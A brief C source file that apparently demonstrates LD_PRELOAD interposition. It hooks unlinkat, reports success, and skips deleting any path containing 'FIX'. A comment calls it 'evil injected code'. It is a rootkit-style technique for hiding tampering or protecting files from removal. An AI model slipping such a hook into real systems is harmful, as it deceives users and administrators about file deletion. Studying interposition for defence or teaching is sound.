#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>

typedef int (*unlinkat_type)(int dirfd, const char *pathname, int flags);
 
int unlinkat(int dirfd, const char *pathname, int flags)
{
    /* Some evil injected code goes here. */
    char * sstr = "FIX";
 
    unlinkat_type orig_unlinkat;
    orig_unlinkat = (unlinkat_type)dlsym(RTLD_NEXT,"unlinkat");
    if(strstr(pathname, sstr))
    	return 0;

    return orig_unlinkat(dirfd, pathname,flags);
}